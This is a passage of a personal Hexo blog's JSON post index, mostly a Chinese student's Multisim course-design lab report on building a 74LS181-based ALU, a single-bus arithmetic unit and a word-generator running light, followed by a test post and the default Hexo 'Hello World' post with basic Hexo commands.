Workbench的Ultiboard2001）的无缝隙数据传输。它具有这样一些特点：（1）采用直观的图形界面创建电路：在计算机屏幕上模仿真实实验室的工作台，绘制电路图需要的元器件、电路仿真需要的测试仪器均可直接从屏幕上选取；（2）软件仪器的控制面板外形和操作方式都与实物相似，可以实时显示测量结果。（3）软件带有丰富的电路元件库，提供多种电路分析方法。（4）作为设计工具，它可以同其它流行的电路分析、设计和制板软件交换数据。（5）还是一个优秀的电子技术训练工具，利用它提供的虚拟仪器可以用比实验室中更灵活的方式进行电路实验，仿真电路的实际运行情况，熟悉常用电子仪器测量方法。 因此非常适合电子类课程的教学和实验，由于其功能非常强大，所以在这里只对课程设计有关的初步知识，基本操作方法进行介绍，有兴趣深入了解的同学可自行访问click me。 软件基本操作方法介绍电路创建由于版本不同，元件工具栏、仪表栏、仿真开关等初始位置会不同。所以在我自己进行课程设计的时候，按10版本的指导书做实验相当痛苦，因为它给的工具栏的位置根本对不上我14.0的版本。这里强调，下面的基本视窗和元件工具栏是按multisim14.0版写的。下面是multisim14.0的基本视窗：下面是14.0版本的元件工具栏 连线Multisim有自动与手工两种连线方法。自动连线选择管脚间最好的路径自动为您完成连线，它可以避免连线通过元件和连线重叠；手工连线要求用户控制连线路径。可以将自动连线与手工连线结合使用，比如，开始用手工连线，然后让Multisim自动地完成连线。自动连线：单击甲部件管脚，再单击乙部件欲连线管脚，实现自动连线。手工连线：在甲乙两部件之间增加若干“节点”，然后进行连线。另外：已经画好的连线可选择其线段用鼠标进行拖动改变位置，使线路更清晰。还可以在图中增加文本进行注释。具体操作可自行详细体会。所有元件都放置好并连线，就可以进行仿真。 用户自定义元件的创建在实验过程中有时也需要一些标准库中没有的元件，此时只有自行定义了。（1） 创建菜单命令“Place” 、“New Hierarchical Block”出现如下对话框： 图1-2 新建层次块示意图在指定文件夹中创建指定的层次块，当然要指定输入引脚和输出引脚的数量。对于8位ALU层次块来说，有22输入，9个输出引脚。如图1-3所示。 图1-3 8位ALU层次块示意图在图1-2中“确定”后进入图1-3，当然中间的两个74ls181n是后来加进来的，并且图右下侧的“电源”和“接地”的元件如果没有的话，在Multisim版本中层次块无法正常使用。进入图1-3后，左边一列为输入引脚，双击引脚名可改为更直观的A1-A8,B1-B8,S0-S4,以及输入进位Cin和算逻运算控制端M。右边一列为输入出引脚，同理，进行修改。当元件放置后并正确连线，存盘。（2） 引用如果在某电路文件中要使用该层次块，可“Place” 、“Hierarchical Block from File”在对话框中选择该层次块文件，则将该自定义元件放置到电路中，如图1-4所示。 图1-4 8位ALU层次块引用示意图层次块加入电路后，连线组成具体电路。在后面实验中还要使用一些层次块电路，下面一一列出。 图1-5 74LS244N层次块示意图 图1-6 74LS273N层次块示意图 图1-7 74LS374N层次块示意图 图1-8 K8层次块示意图在高版本Multisim中有“DSWPK_8”可代替K8层次块。在制作层次块时对相关元件的功能请自行参详。另外更高版本中已经可以采用“子电路”形式创建用户自定义元件. 参考文献：主要参考NI网络文件《Multisim10 电路设计实训教程》 第二部分 课程设计一、课程设计的主要任务和目的课程设计的主要任务是运用有关的知识技术，正确处理各种因素间的相互关系，创造性地完成符合实际要求的设计任务。在独立思考，独立工作和联系实际方面，它对实验者的要求高于平时作业。具体要求如下：1)、能独立运用理论知识和实际材料来解决问题。2)、对所搜集的材料、参考书、文献所提供的论点有周密的组织能力。3)、能用通顺的文字和准确的图表，系统地、完整地表达设计的成果。4)、课程设计辅导老师检查完成情况后，应及时提交实验报告，实验报告主要内容：实验名称及实验完成者、实验目的和任务、实验结果及分析。课程设计的目的是：激发实验者的学习热情，培养其独立工作的能力，让他们在实践活动中将所学知识综合运用，增长才干，积累经验。 二、具体实验实验一 验证74LS181运算和逻辑功能1、实验目的（1） 掌握算术逻辑单元（ALU）的工作原理；（2） 熟悉简单运算器的数据传送通路；（3） 画出逻辑电路图及布出美观整齐的接线图；（4） 验证4位运算功能发生器(74LS181)组合功能。2、实验原理ALU能进行多种算术运算和逻辑运算。4位ALU-74LS181能进行16种算术运算和逻辑运算。功能表如下：(上表中的“/”表示求反) ALU-74LS181引脚说明：M=1 逻辑运算，M=0算术运算。 3、实验内容电路如图2-1所示。图2-1 4位ALU验证电路示意图 验证74LS181型4位ALU的逻辑算术功能，填写下表： 实验报告实验原理：ALU能够进行多种算术运算和逻辑运算。4位ALU—74LS181能够进行16算术运算和逻辑运算。74LS181芯片介绍：该芯片总共有22个引脚，其中包括8个数据输入端：A0、A1、A2、A3，B0、B1、B2、B3。（在八个输入端中，A3和B3为高位）。这八个输入端都是低电平时有效。同时，该芯片还包括S0、S1、S2、S3这四个控制端，这四个控制端主要控制两个四位输入数据的运算，例如加、减、与、或。CN端处理进入芯片的前进位值，M端控制芯片的运算方式，包括算术运算和逻辑运算。F0、F1、F2、F3是四个二进制输出端，以一个四位二进制形式输出运算的结果。CN4负责记录运算后的进位。下面的AEQB、P和G没有用到。实验内容：实验电路图如下： 验证后的实验表格填写如下： 实验二 运算器1、实验目的（1） 熟练掌握算术逻辑单元（ALU）的应用方法；（2） 进一步熟悉简单运算器的数据传送原理；（3） 画出逻辑电路图及布出美观整齐的接线图；（4） 熟练掌握有关数字元件的功能和使用方法。（5） 熟练掌握子电路的创建及使用。2、实验原理本实验仿真单总线结构的运算器，原理如图2-2所示。相应的电路如图2-3所示。电路图中，上右下三方的8条线模拟8位数据总线；K8产生所需数据；74244层次块为三态门电路，将部件与总线连接或断开，切记总线上只能有一个输入；两个74273层次块作为暂存工作寄存器DR1和DR2；两个74374层次块作为通用寄存器组（鉴于电路排列情况，只画出两个通用寄存器GR1和GR2，如果可能的话可设计4个或8个通用寄存器）；众多的开关作为控制电平或打入脉冲；众多的8段代码管显示相应位置的数据信息；核心为8位ALU层次块。图2-2 单总线结构的运算器示意图 3、实验内容在Multisim画出电路图并仿真，完成如下操作。（1） 说明整个电路工作原理。（2） 说明74LS244N的功能及其在电路中作用，及输入信号G有何作用；（3） 说明74LS273N的功能及其在电路中作用，及输入信号CLK有何作用；（4） 说明74LS374N的功能及其在电路中作用，及CLK和OC有何作用；（5） K8产生任意数据存入通用寄存器GR1。（6） K8产生任意数据存入通用寄存器GR2。（7） 完成GR1+GR2→GR1。（8） 完成GR1-GR2→GR2。（9） 完成GR1∧GR2→GR1。（10） 完成GR1∨GR2→GR2。（11） 完成GR1⊕GR2→GR1。（12） -GR1→GR2。（“-”表示逻辑非运算）（13） -GR2→GR1。 实验报告实验原理：本实验仿真单总线结构的运算器，原理如图2-2所示。相应的电路如图2-3所示。（1） 电路图中，上右下三方的8条线模拟8位数据总线；（2） K8产生所需数据；（3） 74244层次块为三态门电路，将部件与总线连接或断开，切记总线上只能有一个输入；（4） 两个74273层次块作为暂存工作寄存器DR1和DR2；（5） 两个74374层次块作为通用寄存器组（鉴于电路排列情况，只画出两个通用寄存器GR1和GR2，如果可能的话可设计4个或8个通用寄存器）；（6） 众多的开关作为控制电平或打入脉冲；众多的8段代码管显示相应位置的数据信息；核心为8位ALU层次块。图2-2 单总线结构的运算器示意图 实验内容：图2-3 运算器示意图在Multisim画出电路图并仿真74LS244N层次块电路图74LS273N层次块电路图74LS374N层次块电路图K8层次块示意图实验二：运算器电路图完成下列操作：（1）说明整个电路工作原理。 1.电路图中，上右下三方的8条线模拟8位数据总线； 2.K8产生所需数据； 3.74244层次块为三态门电路，将部件与总线连接或断开，切记总线上只能有一个输入； 4.两个74273层次块作为暂存工作寄存器DR1和DR2；两个74374层次块作为通用寄存器组（鉴于电路排列情况，只画出两个通用寄存器GR1和GR2，如果可能的话可设计4个或8个通用寄存器）； 5.众多的开关作为控制电平或打入脉冲；众多的8段代码管显示相应位置的数据信息； 6.核心为8位ALU层次块。实验电路共分为五个部分：输入数据、显示数据、运算处理数据、存储数据以及控制数据流向。 1.输入数据部分由自定义层次块K8负责，通过控制内部的八个开关，来向总线中输入两个不同的二进制数。 2.数据流入的地方，对应的DCD_HEX_DIG_RED元器件屏幕将会显示出对应的数，主要有从暂存器中传出的数据、从寄存器中传出的数据以及传入总线上的数据。 3.运算处理数据部分主要由一块74LS181N芯片组成，实现了两个二进制数的逻辑运算和算术运算，并能够将结果通过总线输出并显示。 4.存储模块主要由两个自定义结构块74LS374构成，用来存放操作数和运算结果。 5.控制数据流向主要有左右两侧的开关进行操作，通过控制开关来实现数据在各部件之间的流转和操作执行，从而实现一条完整的操作链。（2）说明74LS244N的功能及其在电路中作用，及输入信号G有何作用。答: 74LS244 为3态8位缓冲器，一般用作总线驱动器，没有锁存的功能，是一个暂存器，它根据控制信号的状态，将总线上地址代码暂存起来。在电路中在部件与总线之间起开关作用，信号G为低电平有效。（3）说明74LS273N的功能及其在电路中作用，及输入信号CLK有何作用。答：74LS273是一种带清除功能的8D触发器，1D - 8D为数据输入端，1Q -8Q为数据输出端，正脉冲触发，低电平清除，常用作数据锁存器，地址锁存器。在电路中作为数据锁存器，输入信号CLK在时钟信号上升沿有效，当接收到正脉冲时，将“D”端的数据传送到“Q”端。（4）说明74LS374N的功能及其在电路中作用，及CLK和OC有何作用。答：74LS374为具有三态输出的8D边缘触发器。在电路中寄存数据，OC为低电平时有效，可以寄存输入进来的数据；OC为高电平时断开。CLK在时钟信号上升沿工作，当接收到正脉冲时将积存的数据输出。（5）K8产生任意数据存入通用寄存器GR1。答：通过K8设定数据，将电路图左侧开关全部调整为高电平，X2的G信号端输入低电平，将数据输入到总线中，然后，将GR1的OC端和CLK端输入低电平，给GR1的CLK端一个正脉冲（0→1）完成数据存入，随即OC端接入高电平，关闭GR1。（6）K8产生任意数据存入通用寄存器GR2。答：通过K8设定数据，将电路图左侧开关全部调整为高电平，X2的G信号端输入低电平，将数据输入到总线中，然后，将GR2的OC端和CLK端输入低电平，给GR2的CLK端一个正脉冲（0→1）完成数据存入，随即OC端接入高电平，关闭GR2。（7）完成GR1+GR2→GR1。 1.根据（6）、（7）中的操作将任意数存入GR1和GR2当中，将所有开关调为1， X6中G信号调为0，X10中的OC端口调为0，X12中的G信号调为0，X6中的G信号调为0，X8中的CLK端口从0→1（正脉冲），将GR1中的数据传入DR1中。 2.然后，再次将所有的开关调为1，将X9的OC端口调为0，X11的G信号调为0，X3的G信号调为0，X4的CLK端口从0→1（正脉冲），将GR2中的数据传入DR2中。 3.调节X5中的S0、S1、S2、S3依次为1、0、0、1，将X5中的M调为0，CN调为1，令X7的G信号为0，结果送入总线，将X10的IC信号调为0，CLK端口从0→1（正脉冲），将数据存入GR1中。（8）完成GR1-GR2→GR2。 1.根据（6）、（7）中的操作将任意数存入GR1和GR2当中，将所有开关调为1， X6中G信号调为0，X10中的OC端口调为0，X12中的G信号调为0，X6中的G信号调为0，X8中的CLK端口从0→1（正脉冲），将GR1中的数据传入DR1中。 2.然后，再次将所有的开关调为1，将X9的OC端口调为0，X11的G信号调为0，X3的G信号调为0，X4的CLK端口从0→1（正脉冲），将GR2中的数据传入DR2中。 3.调节X5中的S0、S1、S2、S3依次为0、1、1、0，将X5中的M调为0，CN调为0，令X7的G信号为0，结果送入总线，将X10的IC信号调为0，CLK端口从0→1（正脉冲），将数据存入GR1中。（9）完成GR1∧GR2→GR1。 1.根据（6）、（7）中的操作将任意数存入GR1和GR2当中，将所有开关调为1， X6中G信号调为0，X10中的OC端口调为0，X12中的G信号调为0，X6中的G信号调为0，X8中的CLK端口从0→1（正脉冲），将GR1中的数据传入DR1中。 2.然后，再次将所有的开关调为1，将X9的OC端口调为0，X11的G信号调为0，X3的G信号调为0，X4的CLK端口从0→1（正脉冲），将GR2中的数据传入DR2中。 3.调节X5中的S0、S1、S2、S3依次为1、0、1、1，将X5中的M调为1，令X7的G信号为0，结果送入总线，将X10的IC信号调为0，CLK端口从0→1（正脉冲），将数据存入GR1中。（10）完成GR1∨GR2→GR2。 1.根据（6）、（7）中的操作将任意数存入GR1和GR2当中，将所有开关调为1， X6中G信号调为0，X10中的OC端口调为0，X12中的G信号调为0，X6中的G信号调为0，X8中的CLK端口从0→1（正脉冲），将GR1中的数据传入DR1中。 2.然后，再次将所有的开关调为1，将X9的OC端口调为0，X11的G信号调为0，X3的G信号调为0，X4的CLK端口从0→1（正脉冲），将GR2中的数据传入DR2中。 3.调节X5中的S0、S1、S2、S3依次为1、1、1、0，将X5中的M调为1，令X7的G信号为0，结果送入总线，将X9的IC信号调为0，CLK端口从0→1（正脉冲），将数据存入GR2中。（11）完成GR1⊕GR2→GR1。 1.根据（6）、（7）中的操作将任意数存入GR1和GR2当中，将所有开关调为1， X6中G信号调为0，X10中的OC端口调为0，X12中的G信号调为0，X6中的G信号调为0，X8中的CLK端口从0→1（正脉冲），将GR1中的数据传入DR1中。 2.然后，再次将所有的开关调为1，将X9的OC端口调为0，X11的G信号调为0，X3的G信号调为0，X4的CLK端口从0→1（正脉冲），将GR2中的数据传入DR2中。 3.调节X5中的S0、S1、S2、S3依次为0、1、1、0，将X5中的M调为1，令X7的G信号为0，结果送入总线，将X10的IC信号调为0，CLK端口从0→1（正脉冲），将数据存入GR1中。（12）-GR1→GR2。（“-”表示逻辑非运算） 1.根据（6）中的操作将任意数存入GR1当中，将所有开关调为1， X6中G信号调为0，X10中的OC端口调为0，X12中的G信号调为0，X6中的G信号调为0，X8中的CLK端口从0→1（正脉冲），将GR1中的数据传入DR1中。 2.调节X5中的S0、S1、S2、S3依次为0、0、0、0，将X5中的M调为1，令X7的G信号为0，结果送入总线，将X9的IC信号调为0，CLK端口从0→1（正脉冲），将数据存入GR2中。（13）GR2→GR1。 1.根据（7）中的操作将任意数存入GR2当中，将所有开关调为1，将X9的OC端口调为0，X11的G信号调为0，X3的G信号调为0，X4的CLK端口从0→1（正脉冲），将GR2中的数据传入DR2中。 2.调节X5中的S0、S1、S2、S3依次为0、1、0、1、，将X5中的M调为1，令X7的G信号为0，结果送入总线，将X10的IC信号调为0，CLK端口从0→1（正脉冲），将数据存入GR1中。 实验三 字发生器及跑马灯1、实验目的了解字发生器使用方法 前提知识 字发生器 字信号发生器（Word Generator）可以采用多种方式产生32位同步逻辑信号，用于对数字电路进行测试，是一个通用的数字输入编辑器。 单击Simulate/Instruments/Word Generator,得到如图2-4（a）所示的字信号发生器的图标。在字信号发生器的左右两侧各有16个端口，分别为0～15和16～31的数字信号输出端，下面的R表示输出端，用以输出与字信号同步的时钟脉冲；T表示输入端，用来接外部触发信号。 双击图2-4（a）中的字信号发生器图标，便可以得到图2-4（b）所示的字信号发生器内部参数设置控制面板。该控制面板大致分为5个部分。 图2-4字信号发生器内部参数设置控制面板(1)Control区：输出字符控制，用来设置字信号发生器的最右侧的字符编辑显示区字符信号的输出方式，有下列3种模式。 Cycle 区：在已经设置好的初始值和终止值之间循环输出字符。 Burst:每单击一次，字信号发生器将从初始值开始到终止值之间的逻辑字符输出一次，即单页模式。 Step：每单击一次，输出一条字信号。即单步模式。 单击Set按钮，弹出如图2-5所示的对话框。该对话框主要用来设置字符信号的变化规律。其中各参数含义如下所述。 No Change：保持原有的设置。 图2-5 字符信号的变化规律 Load：装载以前的字符信号的变化规律的文件。 Save：保存当前的字符信号的变化规律的文件。 Clear buffer:将字信号发生器的最右侧的字符编辑显示区的字信号清零。 Up Count：字符编辑显示区的字信号以加1的形式计数。 Down Count：字符编辑显示区的字信号以减1的形式计数。 Shift Right：字符编辑显示区的字信号右移。 Shift Left：字符编辑显示区的字信号左移。 Display Type选项区：用来设置字符编辑显示区的字信号的显示格式：Hex（十六进制），Dec（十进制）。 Buffer Size：字符编辑显示区的缓冲区的长度。 Initial Patterns：采用某种编码的初始值。(2)Display区：用于设置字信号发生器的最右侧的字符编辑显示区的字符显示格式，有Hex、Dec、Binary、ASCII等几种计数格式。(3)Trigger区：用于设置触发方式。 Internal：内部触发方式，字符信号的输出由Control区的3种输出方式中的某一种来控制。 External：外部触发方式，此时，需要接入外部触发信号。右侧的两个按钮用于外部触发脉冲的上升或下降沿的选择。(4)Frequency区：用于设置字符信号飞输出时钟频率。(5)字符编辑显示区：字信号发生器的最右侧的空白显示区，用来显示字符。跑马灯电路及数据设置 电路如图2-6所示。图2-6 跑马灯电路选择了低16位输出控制16个探针依次点亮。 如图2-7为数据设置，将2的0~15次方依次存入，设置好开始点和终止点，让其循环显示16行数据，从而得到跑马灯效果。图2-7数据设置 注意：为了避免每次临时设置，可以将之“保存save”为xxx.dp文件；运行时“载入load”该文件。另外，频率与实际效果可能有出入，可以调整频率达到较理想效果。 2、实验原理通过设定字发生器的数据，使探针依次点亮，形成跑马灯。3、实验内容选择了低16位输出控制16个探针依次点亮。跑马灯电路图 实验报告跑马灯全亮电路图由于每个小灯分别与字节发生器的一位相连，要使得小灯逐一点亮，可以通过逐一设定有效信号来实现。打开字节发生器的设置，将预设模式调节为右移或左移。 实验四 模拟微程序实现指令1、实验目的模拟微程序实现机器语言指令2、实验原理字发生器的一行输出数据可以作为一条微指令，一条机器语言指令由若干条微指令组成。用字发生器的输出取代图2-3中开关，模拟微指令自动执行实现一条机器语言指令。3、实验内容在Multisim画出电路图并仿真，完成如下操作。（1）产生任意数据存入通用寄存器GR1。（2）产生任意数据存入通用寄存器GR2完成GR1+GR2→GR1。（3）完成GR1-GR2→GR2。（4）完成GR1∧GR2→GR1。（5）完成GR1∨GR2→GR2。（6）完成GR1⊕GR2→GR1。（7）GR1→GR2。（“-”表示逻辑非运算）（8）-GR2→GR1。 实验报告实验原理：字发生器的一行输出数据可以作为一条微指令，一条机器语言指令由若干条微指令组成。用字发生器的输出取代图2-3中开关，模拟微指令自动执行实现一条机器语言指令。实验内容：在Multisim画出电路图仿真，完成如下操作。（1）产生任意数据存入通用寄存器GR1。答：通过K8设定数据，X2的G信号端输入低电平，将数据输入到总线中，然后，将GR1的OC端和CLK端输入低电平，给GR1的CLK端一个正脉冲（0→1）完成数据存入，随即OC端接入高电平，关闭GR1。（2）产生任意数据存入通用寄存器GR2完成GR1+GR2→GR1。答：1.通过K8设定数据，X2的G信号端输入低电平，将数据输入到总线中，然后，将GR2的OC端和CLK端输入低电平，给GR2的CLK端一个正脉冲（0→1）完成数据存入，随即OC端接入高电平，关闭GR2。2.将X2的G信号端接入高电平从而断开K8与总线的连接。将X12的G信号端、X6的G信号端和X8的CLK端口端接低电平，数据从GR1中传出，给X8暂存器一个上升沿信号，随即将X12的G信号端、X6的G信号和X8的CLK接高电平。3.同理，将X11的G信号端、X3的G信号端和X4的CLK端口端接低电平，数据从GR2中传出，给X4暂存器一个上升沿信号，随即将X11和X3的G信号端、X4的CLK端口端接高电平。4.将X5的S0-S3调为1、0、0、1，CN端为高电平、M端为低电平，对暂存器中的数据进行加法运算并将X7的G信号端调为低电平将数据输出到总线上。5.将GR1的OC端口端接低电平，给GR1的CLK端口端一个上升沿信号，将结果存入GR1中，关闭GR1和ALU的输出。（3）完成GR1-GR2→GR2。答：1.将X12的G信号端、X6的G信号端和X8的CLK端口端接低电平，数据从GR1中传出，给X8暂存器一个上升沿信号，随即将X12的G信号端、X6的G信号和X8的CLK接高电平。2.同理，将X11的G信号端、X3的G信号端和X4的CLK端口端接低电平，数据从GR2中传出，给X4暂存器一个上升沿信号，随即将X11和X3的G信号端、X4的CLK端口端接高电平。3.将X5的S0-S3调为0、1、1、0，CN端与M端均为低电平，对暂存器中的数据进行减法运算并将X7的G信号端调为低电平将数据输出到总线上。4.将GR2的OC端口端接低电平，给GR1的CLK端口端一个上升沿信号，将结果存入GR2中，关闭GR2和ALU的输出。 （4）完成GR1∧GR2→GR1。答：1.将X12的G信号端、X6的G信号端和X8的CLK端口端接低电平，数据从GR1中传出，给X8暂存器一个上升沿信号，随即将X12的G信号端、X6的G信号和X8的CLK接高电平。2.同理，将X11的G信号端、X3的G信号端和X4的CLK端口端接低电平，数据从GR2中传出，给X4暂存器一个上升沿信号，随即将X11和X3的G信号端、X4的CLK端口端接高电平。3.将X5的S0-S3调为1、0、1、1，M端为高电平，对暂存器中的数据进行与运算并将X7的G信号端调为低电平将数据输出到总线上。4.将GR1的OC端口端接低电平，给GR1的CLK端口端一个上升沿信号，将结果存入GR1中，关闭GR1和ALU的输出。（5）完成GR1∨GR2→GR2。答：1.将X12的G信号端、X6的G信号端和X8的CLK端口端接低电平，数据从GR1中传出，给X8暂存器一个上升沿信号，随即将X12的G信号端、X6的G信号和X8的CLK接高电平。2.同理，将X11的G信号端、X3的G信号端和X4的CLK端口端接低电平，数据从GR2中传出，给X4暂存器一个上升沿信号，随即将X11和X3的G信号端、X4的CLK端口端接高电平。3.将X5的S0-S3调为1、1、1、0，M端为高电平，对暂存器中的数据进行或运算并将X7的G信号端调为低电平将数据输出到总线上。4.将GR2的OC端口端接低电平，给GR2的CLK端口端一个上升沿信号，将结果存入GR2中，关闭GR2和ALU的输出。（6）完成GR1⊕GR2→GR1。答：1.将X12的G信号端、X6的G信号端和X8的CLK端口端接低电平，数据从GR1中传出，给X8暂存器一个上升沿信号，随即将X12的G信号端、X6的G信号和X8的CLK接高电平。2.同理，将X11的G信号端、X3的G信号端和X4的CLK端口端接低电平，数据从GR2中传出，给X4暂存器一个上升沿信号，随即将X11和X3的G信号端、X4的CLK端口端接高电平。3.将X5的S0-S3调为0、1、1、0，M端为高电平，对暂存器中的数据进行异或运算并将X7的G信号端调为低电平将数据输出到总线上。4.将GR1的OC端口端接低电平，给GR1的CLK端口端一个上升沿信号，将结果存入GR1中，关闭GR1和ALU的输出。（7）-GR1→GR2。（“-”表示逻辑非运算）答：1.将X12的G信号端、X6的G信号端和X8的CLK端口端接低电平，数据从GR1中传出，给X8暂存器一个上升沿信号，随即将X12的G信号端、X6的G信号和X8的CLK接高电平。2.将X5的S0-S3调为0、0、0、0，M端为高电平，对暂存器中的数据进行逻辑非运算并将X7的G信号端调为低电平将数据输出到总线上。3.将GR2的OC端口端接低电平，给GR2的CLK端口端一个上升沿信号，将结果存入GR2中，关闭GR2和ALU的输出。（8）-GR2→GR1。答：1.将X11的G信号端、X3的G信号端和X4的CLK端口端接低电平，数据从GR2中传出，给X4暂存器一个上升沿信号，随即将X11和X3的G信号端、X4的CLK端口端接高电平。2.将X5的S0-S3调为0、1、0、1，M端为高电平，对暂存器中的数据进行逻辑非运算并将X7的G信号端调为低电平将数据输出到总线上。3.将GR1的OC端口端接低电平，给GR1的CLK端口端一个上升沿信号，将结果存入GR1中，关闭GR1和ALU的输出。 @更新于2021.1.3/4/5","comments":true,"categories":[{"name":"计算机基础","slug":"计算机基础","permalink":"http://1905060202.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"课程设计","slug":"课程设计","permalink":"http://1905060202.github.io/tags/%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1/"},{"name":"计算机组成原理","slug":"计算机组成原理","permalink":"http://1905060202.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/"}]},{"title":"胡小宁的第一篇博客文章","date":"2021-01-03T09:40:45.000Z","path":"2021/01/03/我的第一篇博客文章/","text":"这个标题有点冷 我是用来测试的引用，哭唧唧 胡小宁是怎么写博客的？根据Markdown语法编写，胡小宁用的编辑器是notepad++，手敲代码美滋滋（zb大法好） 本文之外，别无它物。——德里达 @更新于2021/1/3","comments":true,"categories":[{"name":"闲言碎语","slug":"闲言碎语","permalink":"http://1905060202.github.io/categories/%E9%97%B2%E8%A8%80%E7%A2%8E%E8%AF%AD/"}],"tags":[{"name":"人生","slug":"人生","permalink":"http://1905060202.github.io/tags/%E4%BA%BA%E7%94%9F/"}]},{"title":"Hello World","date":"2021-01-03T09:34:56.248Z","path":"2021/01/03/hello-world/","text":"欢迎访问 Hexo! 这是第一个post. 点击 我 获取更多内容. 如果你在使用hexo时遇到了任何问题, 你可以在这里找到答案 我遇到麻烦了 或者你可以直接问我在我的github上 GitHub. 快速开始如果是windows操作系统，win+R开启运行，输入cmd打开命令框。在blog（胡小宁自己的博客文件夹）目录下操作。 创作一个帖子1$ hexo new &quot;My New Post&quot; 更多内容: 创作 生成静态文件1$ hexo generate 更多内容: 生成文件 启动本地服务链接1$ hexo server 更多内容: 本地连接服务 在远端部署（也就是github）1$ hexo deploy 更多内容: 推送文件 @更新于2021/1/3","comments":true,"categories":[],"tags":[]}]